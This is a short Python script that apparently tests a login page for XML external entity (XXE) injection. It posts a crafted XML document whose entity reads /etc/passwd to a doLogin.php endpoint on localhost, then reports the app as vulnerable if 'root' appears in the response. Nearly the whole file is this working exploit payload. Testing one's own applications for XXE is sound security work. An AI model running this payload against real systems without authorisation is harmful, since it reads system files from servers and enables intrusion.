import requests


def main(url):
    data = ' <!DOCTYPE a[\x0d\x0a\x09<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\x0d\x0a]>\x0d\x0a<user><username>&xxe;</username><password>admin</password></user>'

    req = requests.post(url, data=data)
    result = bool(req.text.find("root") > 0)
    if result :
        msg = "The app is vulnerable"
    else :
        msg = "You are in good hands"
    return (result, msg)

if __name__ == '__main__':
	url = "http://localhost/doLogin.php"
	res = main(url)
	print(res)